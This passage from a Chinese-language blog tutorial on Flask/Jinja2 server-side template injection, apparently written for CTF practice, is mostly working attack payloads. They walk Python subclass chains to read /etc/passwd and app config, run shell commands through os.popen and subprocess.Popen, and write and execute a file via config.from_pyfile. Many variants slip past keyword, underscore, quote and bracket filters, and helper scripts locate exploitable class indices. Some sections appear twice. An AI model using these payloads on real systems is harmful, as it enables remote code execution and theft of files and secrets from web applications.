&#39;codecs.IncrementalEncoder&#39;&gt;, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;]可以看到有一个`&lt;type &#39;file&#39;&gt;`</code></pre><p>4 、利用之</p><pre><code>&#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;/etc/passwd&#39;).read()</code></pre><p>放到模板里<img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/1540787928_5bd68ed820299.png!small" alt="5.png"></p><p>可以看到读取到了文件。</p><h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p>继续看命令执行payload的构造，思路和构造文件读取的一样。</p><p>寻找包含os模块的脚本</p><pre><code>#!/usr/bin/env python# encoding: utf-8for item in &#39;&#39;.__class__.__mro__[2].__subclasses__():    try:         if &#39;os&#39; in item.__init__.__globals__:             print num,item         num+=1    except:        print &#39;-&#39;        num+=1</code></pre><p>输出</p><pre><code>-71 &lt;class &#39;site._Printer&#39;&gt;----76 &lt;class &#39;site.Quitter&#39;&gt;</code></pre><p>payload</p><pre><code class="python">&#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;)</code></pre><p>一般利用点还有 warnings.catch_warnings（一般在59）这个子类，虽然它没有os模块，但warnings.catch_warnings类在在内部定义了_module=sys.modules[‘warnings’]，然后warnings模块包含有__builtins__，也就是说如果可以找到warnings.catch_warnings类，则可以不使用globals，payload如下</p><pre><code>&#123;&#123;''.__class__.__mro__[1].__subclasses__()[40]()._module.__builtins__['__import__']("os").popen('whoami').read()&#125;&#125;</code></pre><p>总而言之，原理都是先找到含有__builtins__的类，然后再进一步利用</p><ul><li>subprocess.Popen进行RCE</li></ul><p>我们可以用find2.py寻找subprocess.Popen这个类，可以直接RCE，payload如下</p><pre><code>&#123;&#123;''.__class__.__mro__[2].__subclasses__()[258]('whoami',shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;</code></pre><ul><li>直接利用os</li></ul><p>一开始我以为这种方法只能用于python2，因为我在本地实验的时候python3中无法找到直接含有os的类，但后来发现python3其实也是能够用的，主要是环境里面有这个那个类才行</p><p>我们把上面的find.py脚本中的search变量赋值为os，去寻找含有os的类</p><pre><code>λ python find.py(&lt;class &#39;site._Printer&#39;&gt;, 69)(&lt;class &#39;site.Quitter&#39;&gt;, 74)</code></pre><p>后面如法炮制，payload如下</p><pre><code>&#123;&#123;().__class__.__base__.__subclasses__()[69].__init__.__globals__['os'].popen('whoami').read()&#125;&#125;</code></pre><p>构造paylaod的思路和构造文件读取的是一样的。只不过命令执行的结果无法直接看到，需要利用curl将结果发送到自己的vps或者利用ceye</p><p>一些利用脚本：</p><p>find.py</p><p><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/f5452aaf65534a159b2328f9b8152b07.jpeg" alt="img"></p><p>我们运行这个脚本</p><pre><code>λ python3 find.py&lt;class &#39;os._wrap_close&#39;&gt; 128</code></pre><p>可以发现object基类的第128个子类名为os._wrap_close的这个类有popen方法</p><p>先调用它的__init__方法进行初始化类</p><pre><code>Python 3.7.8&gt;&gt;&gt; &quot;&quot;.__class__.__bases__[0].__subclasses__()[128].__init__&lt;function _wrap_close.__init__ at 0x000001FCD0B21E58&gt;</code></pre><p>再调用__globals__可以获取到方法内以字典的形式返回的方法、属性等值</p><pre><code>Python 3.7.8&gt;&gt;&gt; &quot;&quot;.__class__.__bases__[0].__subclasses__()[128].__init__.__globals__&#123;&#39;__name__&#39;: &#39;os&#39;...中间省略...&lt;class &#39;os.PathLike&#39;&gt;&#125;</code></pre><p>然后就可以调用其中的popen来执行命令</p><pre><code>Python 3.7.8&gt;&gt;&gt; &quot;&quot;.__class__.__bases__[0].__subclasses__()[128].__init__.__globals__[&#39;popen&#39;](&#39;whoami&#39;).read()&#39;desktop-t6u2ptl\\think\n&#39;</code></pre><p>但是上面的方法仅限于在本地寻找，因为在做CTF题目的时候，我们无法在题目环境中运行这个find.py，这里用hhhm师傅的一个脚本直接去寻找子类</p><p>我们首先把所有的子类列举出来</p><pre><code>Python 3.7.8&gt;&gt;&gt; ().__class__.__bases__[0].__subclasses__()...一大堆的子类</code></pre><p>然后把子类列表放进下面脚本中的a中，然后寻找os._wrap_close这个类</p><p>find2.py</p><p><a href="javascript:void(0);"><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode.gif" alt="复制代码"></a></p><pre><code>import jsona = &quot;&quot;&quot;&lt;class &#39;type&#39;&gt;,...,&lt;class &#39;subprocess.Popen&#39;&gt;&quot;&quot;&quot;num = 0allList = []result = &quot;&quot;for i in a:    if i == &quot;&gt;&quot;:        result += i        allList.append(result)        result = &quot;&quot;    elif i == &quot;\n&quot; or i == &quot;,&quot;:        continue    else:        result += i        for k,v in enumerate(allList):    if &quot;os._wrap_close&quot; in v:        print(str(k)+&quot;---&gt;&quot;+v)</code></pre><p><a href="javascript:void(0);"><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode.gif" alt="复制代码"></a></p><p><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/552cd597f7d84fcc9d284fdfe0fba5d4.jpeg" alt="img"></p><p>我们首先把所有的子类列举出来</p><pre><code>Python 3.7.8&gt;&gt;&gt; ().__class__.__bases__[0].__subclasses__()...一大堆的子类</code></pre><p>然后把子类列表放进下面脚本中的a中，然后寻找os._wrap_close这个类</p><p>find2.py</p><p><a href="javascript:void(0);"><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode-16342831245848.gif" alt="复制代码"></a></p><pre><code>import jsona = &quot;&quot;&quot;&lt;class &#39;type&#39;&gt;,...,&lt;class &#39;subprocess.Popen&#39;&gt;&quot;&quot;&quot;num = 0allList = []result = &quot;&quot;for i in a:    if i == &quot;&gt;&quot;:        result += i        allList.append(result)        result = &quot;&quot;    elif i == &quot;\n&quot; or i == &quot;,&quot;:        continue    else:        result += i        for k,v in enumerate(allList):    if &quot;os._wrap_close&quot; in v:        print(str(k)+&quot;---&gt;&quot;+v)</code></pre><p><a href="javascript:void(0);"><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode-16342831245848.gif" alt="复制代码"></a></p><p><img src="https://p6-tt-ipv6.byteimg.com/origin/pgc-image/552cd597f7d84fcc9d284fdfe0fba5d4" alt="img"></p><p>又或者用如下的requests脚本去跑</p><p>find3.py</p><p><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/4512851a74e64923982ffcf8b91e38b9.jpeg" alt="img"></p><p><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/9c63cdfd510c443a8294cfb5091773d6.jpeg" alt="img"></p><h2 id="大概过程（读取config）"><a href="#大概过程（读取config）" class="headerlink" title="大概过程（读取config）"></a>大概过程（读取config）</h2><p>一般来说，读取config我们直接就，就能读取config配置文件，但是为了增加难度，肯定会过滤掉config，让我们读取config配置文件</p><p>这时就需要通过python自带函数调用____globals____变量集合,然后调用其中的current_app全局变量的config</p><h3 id="flask有4个全局变量"><a href="#flask有4个全局变量" class="headerlink" title="flask有4个全局变量"></a>flask有4个全局变量</h3><pre><code>current_app代表当前flask程序实例g作为flask程序全局的临时变量requests客户端发送的HTTP请求内容session用户会话</code></pre><h3 id="python自带函数"><a href="#python自带函数" class="headerlink" title="python自带函数"></a>python自带函数</h3><h4 id="config"><a href="#config" class="headerlink" title="config"></a>config</h4><p>你可以从模板中直接访问Flask当前的config对象:</p><pre><code>&#123;&#123;config.SQLALCHEMY_DATABASE_URI&#125;&#125;sqlite:///database.db</code></pre><h4 id="request"><a href="#request" class="headerlink" title="request"></a>request</h4><p>就是flask中代表当前请求的request对象：</p><pre><code>&#123;&#123;request.url&#125;&#125;http://127.0.0.1</code></pre><h4 id="session"><a href="#session" class="headerlink" title="session"></a>session</h4><p>为Flask的session对象</p><pre><code>&#123;&#123;session.new&#125;&#125;True</code></pre><h4 id="url-for"><a href="#url-for" class="headerlink" title="url_for()"></a>url_for()</h4><p>url_for会根据传入的路由器函数名,返回该路由对应的URL,在模板中始终使用url_for()就可以安全的修改路由绑定的URL,则不比担心模板中渲染出错的链接:</p><pre><code>&#123;&#123;url_for('home')&#125;&#125;/</code></pre><p>如果我们定义的路由URL是带有参数的,则可以把它们作为关键字参数传入url_for(),Flask会把他们填充进最终生成的URL中:</p><pre><code>&#123;&#123; url_for('post', post_id=1)&#125;&#125;/post/1</code></pre><h4 id="get-flashed-messages"><a href="#get-flashed-messages" class="headerlink" title="get_flashed_messages()"></a>get_flashed_messages()</h4><p>这个函数会返回之前在flask中通过flask()传入的消息的列表，flash函数的作用很简单,可以把由Python字符串表示的消息加入一个消息队列中，再使用get_flashed_message()函数取出它们并消费掉：</p><pre><code>&#123;%for message in get_flashed_messages()%&#125;    &#123;&#123;message&#125;&#125;&#123;%endfor%&#125;</code></pre><p>大致playload</p><pre><code>&#123;&#123;url_for('__globals__')['current_app']['config']&#125;&#125;</code></pre><p>下面我列一些pos</p><pre><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('app.py','r').read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><pre><code class="python">读目录、文件&#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('ls').read()")&#125;&#125;&#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("__import__('os').listdir('/')")&#125;&#125;&#123;&#123;[].__class__.__bases__[0].__subclasses__()[71].__init__.__globals__['os'].__dict__['system']('ls')&#125;&#125;&#123;&#123;[].__class__.__bases__[0].__subclasses__()[71].__init__.__globals__['os'].popen(cat /xxx/flag)&#125;&#125;&#123;&#123;[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.open('xxx','r').read()&#125;&#125;页面没有回显时#命令执行： &#123;% for c in [].__class__.__base__.__subclasses__() %&#125; #先通过for循环根据模块名寻找符合要求的模块&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('id').read()") &#125;&#125;#如果找到该模块就进行后续的函数操作&#123;% endif %&#125;&#123;% endfor %&#125;   # 结束判断结束循环#文件操作    &#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('filename', 'r').read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><h2 id="一些绕过方法"><a href="#一些绕过方法" class="headerlink" title="一些绕过方法"></a>一些绕过方法</h2><p>对一些过滤的绕过方法</p><h3 id="过滤了小括号"><a href="#过滤了小括号" class="headerlink" title="过滤了小括号"></a>过滤了小括号</h3><p>用python的内置函数</p><ul><li>get_flashed_messages()</li><li>url_for()</li></ul><p>payload</p><pre><code class="python">&#123;&#123;url_for.__globals__&#125;&#125;&#123;&#123;url_for.__globals__['current_app'].config['FLAG']&#125;&#125;&#123;&#123;get_flashed_messages.__globals__['current_app'].config['FLAG']&#125;&#125;1234</code></pre><h4 id="过滤了-class、-subclasses、-read等关键词"><a href="#过滤了-class、-subclasses、-read等关键词" class="headerlink" title="过滤了 class、 subclasses、 read等关键词"></a>过滤了 <code>class</code>、 <code>subclasses</code>、 <code>read</code>等关键词</h4><p>用request</p><ul><li>GET: request.args</li><li>Cookies: request.cookies</li><li>Headers: request.headers</li><li>Environment: request.environ</li><li>Values: request.values</li></ul><p>一些用法</p><ul><li><code>request.__class__</code></li><li><code>request[&quot;__class__&quot;]</code></li><li><code>request|attr(&quot;__class__&quot;)</code></li></ul><p>payload</p><pre><code class="python">&#123;&#123;''[request.args.a][request.args.b][2][request.args.c]()&#125;&#125;?a=__class__&amp;b=__mro__&amp;c=__subclasses__1</code></pre><h4 id="过滤了下划线"><a href="#过滤了下划线" class="headerlink" title="过滤了下划线_"></a>过滤了下划线<code>_</code></h4><p>payload</p><pre><code class="python">&#123;&#123;request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)&#125;&#125;&amp;class=class&amp;usc=_</code></pre><p>其实现过程如下</p><pre><code class="python">&#123;&#123;request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)&#125;&#125;&#123;&#123;request|attr(["_"*2,"class","_"*2]|join)&#125;&#125;&#123;&#123;request|attr(["__","class","__"]|join)&#125;&#125;&#123;&#123;request|attr("__class__")&#125;&#125;&#123;&#123;request.__class__&#125;&#125;</code></pre><h4 id="过滤了中括号-和"><a href="#过滤了中括号-和" class="headerlink" title="过滤了中括号[和]"></a>过滤了中括号<code>[</code>和<code>]</code></h4><p>payload</p><pre><code class="python">&#123;&#123;request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)&#125;&#125;&amp;class=class&amp;usc=_&#123;&#123;request|attr(request.args.getlist(request.args.l)|join)&#125;&#125;&amp;l=a&amp;a=_&amp;a=_&amp;a=class&amp;a=_&amp;a=_12</code></pre><h4 id="过滤了-join"><a href="#过滤了-join" class="headerlink" title="过滤了|join"></a>过滤了<code>|join</code></h4><p>用<code>|format</code>    payload</p><pre><code class="python">&#123;&#123;request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))&#125;&#125;&amp;f=%s%sclass%s%s&amp;a=_1</code></pre><h4 id="无敌绕过的最终RCE"><a href="#无敌绕过的最终RCE" class="headerlink" title="无敌绕过的最终RCE"></a>无敌绕过的最终RCE</h4><p>绕过<code>[</code>，<code>]</code>检查，但不绕过<code>__</code>检查<br> 使用该<code>set</code>函数来访问必需的<code>object（i）</code>类<br> <code>pop()</code>将检索file对象，然后使用我们的已知参数调用该对象<br> 与初始RCE相似，这将创建一个python文件<code>/tmp/foo.py</code>并执行<code>print 1337</code>有效负载</p><pre><code class="python">&#123;%set%20a,b,c,d,e,f,g,h,i%20=%20request.__class__.__mro__%&#125;&#123;&#123;i.__subclasses__().pop(40)(request.args.file,request.args.write).write(request.args.payload)&#125;&#125;&#123;&#123;config.from_pyfile(request.args.file)&#125;&#125;&amp;file=/tmp/foo.py&amp;write=w&amp;payload=print+1337</code></pre><p>绕过所有的rce</p><pre><code class="python">&#123;%set%20a,b,c,d,e,f,g,h,i%20=%20request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.mro,request.args.usc*2)|join)%&#125;&#123;&#123;(i|attr((request.args.usc*2,request.args.subc,request.args.usc*2)|join)()).pop(40)(request.args.file,request.args.write).write(request.args.payload)&#125;&#125;&#123;&#123;config.from_pyfile(request.args.file)&#125;&#125;&amp;class=class&amp;mro=mro&amp;subc=subclasses&amp;usc=_&amp;file=/tmp/foo.py&amp;write=w&amp;payload=print+1337</code></pre><h1 id="python2的方法"><a href="#python2的方法" class="headerlink" title="python2的方法"></a><strong>python2的方法</strong></h1><p>因为python3和python2两个版本下有差别，这里把python2单独拿出来说</p><p>tips：python2的string类型不直接从属于属于基类，所以要用两次 <strong>bases</strong>[0]</p><p><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/97cd39ea2aec44709fc68929a10ed2ea.jpeg" alt="img"></p><ul><li>file类读写文件</li></ul><p>本方法只能适用于python2，因为在python3中file类已经被移除了</p><p><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/a9d24ae5c1bd41359cfba6666b1f6228.png" alt="img"></p><p>可以使用dir查看file对象中的内置方法</p><p><a href="javascript:void(0);"><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode-163428343034715.gif" alt="复制代码"></a></p><pre><code>&gt;&gt;&gt; dir(().__class__.__bases__[0].__subclasses__()[40])[&#39;__class__&#39;, &#39;__delattr__&#39;, &#39;__doc__&#39;, &#39;__enter__&#39;, &#39;__exit__&#39;, &#39;__format__&#39;, &#39;__getattribute__&#39;, &#39;__hash__&#39;, &#39;__init__&#39;, &#39;__iter__&#39;, &#39;__new__&#39;, &#39;__reduce__&#39;, &#39;__reduce_ex__&#39;, &#39;__repr__&#39;, &#39;__setattr__&#39;, &#39;__sizeof__&#39;, &#39;__str__&#39;, &#39;__subclasshook__&#39;, &#39;close&#39;, &#39;closed&#39;, &#39;encoding&#39;, &#39;errors&#39;, &#39;fileno&#39;, &#39;flush&#39;, &#39;isatty&#39;, &#39;mode&#39;, &#39;name&#39;, &#39;newlines&#39;, &#39;next&#39;, &#39;read&#39;, &#39;readinto&#39;, &#39;readline&#39;, &#39;readlines&#39;, &#39;seek&#39;, &#39;softspace&#39;, &#39;tell&#39;, &#39;truncate&#39;, &#39;write&#39;, &#39;writelines&#39;, &#39;xreadlines&#39;]</code></pre><p><a href="javascript:void(0);"><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode-163428343034715.gif" alt="复制代码"></a></p><p>然后直接调用里面的方法即可，payload如下</p><p>读文件</p><pre><code>&#123;&#123;().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()&#125;&#125;&#123;&#123;().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').readlines()&#125;&#125;</code></pre><ul><li>warnings类中的linecache</li></ul><p>本方法只能用于python2，因为在python3中会报错’function object’ has no attribute ‘func_globals’，猜测应该是python3中func_globals被移除了还是啥的，如果不对请师傅们指出</p><p>我们把上面的find.py脚本中的search变量赋值为linecache，去寻找含有linecache的类</p><pre><code>λ python find.py(&lt;class &#39;warnings.WarningMessage&#39;&gt;, 59)(&lt;class &#39;warnings.catch_warnings&#39;&gt;, 60)</code></pre><p>后面如法炮制，payload如下</p><pre><code>&#123;&#123;[].__class__.__base__.__subclasses__()[60].__init__.func_globals['linecache'].os.popen('whoami').read()&#125;&#125;</code></pre><p><strong>python2&amp;3的方法</strong></p><p>这里介绍python2和python3两个版本通用的方法</p><ul><li>__builtins__代码执行</li></ul><p>这种方法是比较常用的，因为他两种python版本都适用</p><p>首先__builtins__是一个包含了大量内置函数的一个模块，我们平时用python的时候之所以可以直接使用一些函数比如abs，max，就是因为__builtins__这类模块在Python启动时为我们导入了，可以使用dir(<strong>builtins</strong>)来查看调用方法的列表，然后可以发现__builtins__下有eval，__import__等的函数，因此可以利用此来执行命令。</p><p>把上面find.py脚本search变量赋值为__builtins__，然后找到第140个类warnings.catch_warnings含有他，而且这里的话比较多的类都含有__builtins__，比如常用的还有email.header._ValueFormatter等等，这也可能是为什么这种方法比较多人用的原因之一吧</p><p>再调用eval等函数和方法即可，payload如下</p><p><a href="javascript:void(0);"><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode-163428343034715.gif" alt="复制代码"></a></p><pre><code>&#123;&#123;().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__['__builtins__']['eval']("__import__('os').system('whoami')")&#125;&#125;&#123;&#123;().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('whoami').read()")&#125;&#125;&#123;&#123;().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__['__builtins__']['__import__']('os').popen('whoami').read()&#125;&#125;&#123;&#123;().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__['__builtins__']['open']('/etc/passwd').read()&#125;&#125;</code></pre><p><a href="javascript:void(0);"><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode-163428343034715.gif" alt="复制代码"></a></p><p>又或者用如下两种方式，用模板来跑循环</p><p><a href="javascript:void(0);"><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode-163428343034715.gif" alt="复制代码"></a></p><pre><code>&#123;% for c in ().__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()") &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__ == 'catch_warnings' %&#125;  &#123;% for b in c.__init__.__globals__.values() %&#125;  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;    &#123;% if 'eval' in b.keys() %&#125;      &#123;&#123; b['eval']('__import__("os").popen("whoami").read()') &#125;&#125;    &#123;% endif %&#125;  &#123;% endif %&#125;  &#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><p><a href="javascript:void(0);"><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode-163428343034715.gif" alt="复制代码"></a></p><p><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/f45931bb692441b6b6040aa863eaf12c.png" alt="img"></p><p>读取文件payload</p><pre><code>&#123;% for c in ().__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('filename', 'r').read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><p>另外一些绕过方法:</p><p><strong>绕过黑名单</strong></p><p>CTF中一般考的就是怎么绕过SSTI，我们学会如何去构造payload之后，还要学习如何去绕过一些过滤，然后下面由于环境的不同，payload中类的位置也是就那个数字可能会和文章中不一样，需要自己动手测一下</p><p><strong>过滤了点</strong></p><p>过滤了.</p><p>在python中，可用以下表示法可用于访问对象的属性</p><pre><code>&#123;&#123;().__class__&#125;&#125;&#123;&#123;()["__class__"]&#125;&#125;&#123;&#123;()|attr("__class__")&#125;&#125;&#123;&#123;getattr('',"__class__")&#125;&#125;</code></pre><p>也就是说我们可以通过[]，attr()，getattr()来绕过点</p><ul><li>使用[]绕过</li></ul><p>使用访问字典的方式来访问函数或者类等，下面两行是等价的</p><pre><code>&#123;&#123;().__class__&#125;&#125;&#123;&#123;()['__class__']&#125;&#125;</code></pre><p>以此，我们可以构造payload如下</p><pre><code>&#123;&#123;()['__class__']['__base__']['__subclasses__']()[433]['__init__']['__globals__']['popen']('whoami')['read']()&#125;&#125;</code></pre><ul><li>使用attr()绕过</li></ul><p>使用原生JinJa2的函数attr()，以下两行是等价的</p><pre><code>&#123;&#123;().__class__&#125;&#125;&#123;&#123;()|attr('__class__')&#125;&#125;</code></pre><p>以此，我们可以构造payload如下</p><pre><code>&#123;&#123;()|attr('__class__')|attr('__base__')|attr('__subclasses__')()|attr('__getitem__')(65)|attr('__init__')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('eval')('__import__("os").popen("whoami").read()')&#125;&#125;</code></pre><ul><li>使用getattr()绕过</li></ul><p>这种方法有时候由于环境问题不一定可行，会报错’getattr’ is undefined，所以优先使用以上两种</p><pre><code>Python 3.7.8&gt;&gt;&gt; ().__class__&lt;class &#39;tuple&#39;&gt;&gt;&gt;&gt; getattr((),&quot;__class__&quot;)&lt;class &#39;tuple&#39;&gt;</code></pre><p><strong>过滤引号</strong></p><p>过滤了’和”</p><ul><li>request绕过</li></ul><p>flask中存在着request内置对象可以得到请求的信息，request可以用5种不同的方式来请求信息，我们可以利用他来传递参数绕过</p><pre><code>request.args.namerequest.cookies.namerequest.headers.namerequest.values.namerequest.form.name</code></pre><p>payload如下</p><p>GET方式，利用request.args传递参数</p><pre><code>&#123;&#123;().__class__.__bases__[0].__subclasses__()[213].__init__.__globals__.__builtins__[request.args.arg1](request.args.arg2).read()&#125;&#125;&amp;arg1=open&amp;arg2=/etc/passwd</code></pre><p>POST方式，利用request.values传递参数</p><pre><code>&#123;&#123;().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__.__builtins__[request.values.arg1](request.values.arg2).read()&#125;&#125;post:arg1=open&amp;arg2=/etc/passwd</code></pre><p>Cookie方式，利用request.cookies传递参数</p><pre><code>&#123;&#123;().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__.__builtins__[request.cookies.arg1](request.cookies.arg2).read()&#125;&#125;Cookie:arg1=open;arg2=/etc/passwd</code></pre><p>剩下两种方法也差不多，这里就不赘述了</p><ul><li>chr绕过</li></ul><pre><code>&#123;&#123;().__class__.__base__.__subclasses__()[§0§].__init__.__globals__.__builtins__.chr&#125;&#125;</code></pre><p>这里先爆破subclasses，获取subclasses中含有chr的类索引</p><p><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/ce9a23785e014adda7f75ca7c05d5c33.jpeg" alt="img"></p><p>然后就可以用chr来绕过传参时所需要的引号，然后需要用chr来构造需要的字符</p><p>这里我写了个脚本可以快速构造想要的ascii字符</p><p><a href="javascript:void(0);"><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode-163428445508020.gif" alt="复制代码"></a></p><pre><code>&lt;?php$a = &#39;whoami&#39;;$result = &#39;&#39;;for($i=0;$i&lt;strlen($a);$i++)&#123; $result .= &#39;chr(&#39;.ord($a[$i]).&#39;)%2b&#39;;&#125;echo substr($result,0,-3);?&gt;//chr(119)%2bchr(104)%2bchr(111)%2bchr(97)%2bchr(109)%2bchr(105)</code></pre><p><a href="javascript:void(0);"><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode-163428445508020.gif" alt="复制代码"></a></p><p>最后payload如下</p><pre><code>&#123;% set chr = ().__class__.__base__.__subclasses__()[7].__init__.__globals__.__builtins__.chr %&#125;&#123;&#123;().__class__.__base__.__subclasses__()[257].__init__.__globals__.popen(chr(119)%2bchr(104)%2bchr(111)%2bchr(97)%2bchr(109)%2bchr(105)).read()&#125;&#125;</code></pre><p><strong>过滤下划线</strong></p><p>过滤了_</p><ul><li>编码绕过</li></ul><p>使用十六进制编码绕过，_编码后为\x5f，.编码后为\x2E</p><p>payload如下</p><pre><code>&#123;&#123;()["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fbases\x5f\x5f"][0]["\x5f\x5fsubclasses\x5f\x5f"]()[376]["\x5f\x5finit\x5f\x5f"]["\x5f\x5fglobals\x5f\x5f"]['popen']('whoami')['read']()&#125;&#125;</code></pre><p>这里甚至可以全十六进制绕过，顺便把关键字也一起绕过，这里先给出个python脚本方便转换</p><p><a href="javascript:void(0);"><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode-163428445508020.gif" alt="复制代码"></a></p><pre><code>string1=&quot;__class__&quot;string2=&quot;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&quot;def tohex(string):  result = &quot;&quot;  for i in range(len(string)):      result=result+&quot;\\x&quot;+hex(ord(string[i]))[2:]  print(result)tohex(string1) #\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5fprint(string2) #__class__</code></pre><p><a href="javascript:void(0);"><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode-163428445508020.gif" alt="复制代码"></a></p><p>随便构造个payload如下</p><pre><code>&#123;&#123;""["\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f"]["\x5f\x5f\x62\x61\x73\x65\x5f\x5f"]["\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f"]()[64]["\x5f\x5f\x69\x6e\x69\x74\x5f\x5f"]["\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f"]["\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f"]["\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f"]("\x6f\x73")["\x70\x6f\x70\x65\x6e"]("whoami")["\x72\x65\x61\x64"]()&#125;&#125;</code></pre><ul><li>request绕过</li></ul><p>在上面的过滤引号已经介绍过了，这里不再赘述</p><p><strong>过滤关键字</strong></p><p>首先要看关键字是如何被过滤的</p><p>如果是替换为空，可以尝试双写绕过，或者使用黑名单逻辑漏洞错误绕过，即使用黑名单最后一个关键字替换绕过</p><p>如果直接ban了，就可以使用字符串拼接的方式等方法进行绕过，常用方法如下</p><ul><li>拼接字符绕过</li></ul><p>这里以过滤class为例子，用中括号括起来然后里面用引号连接，可以用+号或者不用</p><pre><code>&#123;&#123;()['__cla'+'ss__'].__bases__[0]&#125;&#125;&#123;&#123;()['__cla''ss__'].__bases__[0]&#125;&#125;</code></pre><p>随便写个payload如下</p><pre><code>&#123;&#123;()['__cla''ss__'].__bases__[0].__subclasses__()[40].__init__.__globals__['__builtins__']['ev''al']("__im""port__('o''s').po""pen('whoami').read()")&#125;&#125;</code></pre><p>或者可以使用join来进行拼接</p><pre><code>&#123;&#123;()|attr(["_"*2,"cla","ss","_"*2]|join)&#125;&#125;</code></pre><p>看到有师傅甚至用管道符加上format方法来拼接的骚操作，也就是我们平时说的格式化字符串，其中的%s被l替换</p><pre><code>&#123;&#123;()|attr(request.args.f|format(request.args.a))&#125;&#125;&amp;f=__c%sass__&amp;a=l</code></pre><ul><li>使用使用str原生函数</li></ul><p>replace绕过，payload如下</p><pre><code>&#123;&#123;().__getattribute__('__claAss__'.replace("A","")).__bases__[0].__subclasses__()[376].__init__.__globals__['popen']('whoami').read()&#125;&#125;</code></pre><p>decode绕过，但这种方法经过测试只能在python2下使用，payload如下</p><pre><code>&#123;&#123;().__getattribute__('X19jbGFzc19f'.decode('base64')).__base__.__subclasses__()[40]("/etc/passwd").read()&#125;&#125;</code></pre><ul><li>替代的方法</li></ul><p>过滤init，可以用__enter__或__exit__替代</p><pre><code>&#123;&#123;().__class__.__bases__[0].__subclasses__()[213].__enter__.__globals__['__builtins__']['open']('/etc/passwd').read()&#125;&#125;&#123;&#123;().__class__.__bases__[0].__subclasses__()[213].__exit__.__globals__['__builtins__']['open']('/etc/passwd').read()&#125;&#125;</code></pre><p>过滤config，我们通常会用获取当前设置，如果被过滤了可以使用以下的payload绕过</p><pre><code>&#123;&#123;self&#125;&#125; ⇒ &lt;TemplateReference 